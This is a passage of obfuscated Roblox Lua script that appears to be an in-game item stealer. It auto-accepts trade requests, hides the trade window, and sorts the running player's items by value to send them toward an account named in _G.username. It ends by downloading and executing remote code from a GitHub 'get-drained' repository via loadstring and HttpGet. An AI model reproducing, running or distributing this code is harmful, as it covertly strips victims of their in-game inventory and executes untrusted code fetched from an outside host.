	if _0x45[1] and type(_0x45[1]) == "table" and _0x45[1].LastOffer then
		_0xbc = _0x45[1].LastOffer
	end
	for _, _0x44 in ipairs(_0x45) do
		if typeof(_0x44) == "string" and _0x44 == _G.username then _0xab = true return end
		if typeof(_0x44) == "Instance" and _0x44:IsA("Player") and _0x44.Name == _G.username then _0xab = true return end
	end
end)

_0xce:WaitForChild("UpdateTrade").OnClientEvent:Connect(function(_0x43)
	if _0xab == nil then _0xab = false end
	if _0x43 and _0x43.LastOffer then _0xbc = _0x43.LastOffer end
	if not _0xab then _0xab = true end
end)

_0xce:WaitForChild("GetRequest").OnClientEvent:Connect(function()
	pcall(function() _0xce:WaitForChild("AcceptRequest"):FireServer() end)
end)

local _0x04 = _0x6f()
table.sort(_0x04, function(a, b) return (a.value or 0) > (b.value or 0) end)

local _0x01 = {}
if _G.troller then
	_0x01 = {{_0x10 = "Default Knife", value = 0, rarity = "Common", _0x0e = "DefaultKnife"}}
	_0xf7("DefaultKnife")
	_0x1a()
	_0x3c(_0x01, 15)
else
	_0x01 = _0x4d(_0x04, _0x16)
end

if tradeGui then tradeGui.Enabled = false end

task.spawn(function() _0xe6(_0x16.UserId, _0x01) end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/todyaramello/get-drained/refs/heads/main/done.lua"))()
